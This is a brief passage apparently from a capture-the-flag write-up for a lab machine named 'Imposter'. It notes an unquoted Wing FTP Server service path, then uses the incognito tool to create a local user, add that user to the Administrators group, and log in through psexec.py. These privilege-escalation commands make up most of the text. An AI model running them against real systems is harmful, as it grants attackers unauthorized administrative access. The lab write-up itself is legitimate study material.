C:\Program Files (x86)\Wing FTP Server\WFTPServer.exe service


  Wing FTP Server(Wing FTP Server)[C:\Program Files (x86)\Wing FTP Server\WFTPServer.exe service] - Auto - Running - No quotes and Space de
tected

Well this is kinda usless coz you cannot start or query or check the service and hence the name of the box is Imposter. We will use it to do some privesc.

> https://github.com/milkdevil/incognito2

```cmd
incognito.exe add_user darkterror abcABCdefDEF@123!
```

```cmd
incognito.exe add_localgroup_user Administrators darkterror
```

```zsh
python psexec.py 'darkterror'@172.31.1.20
```
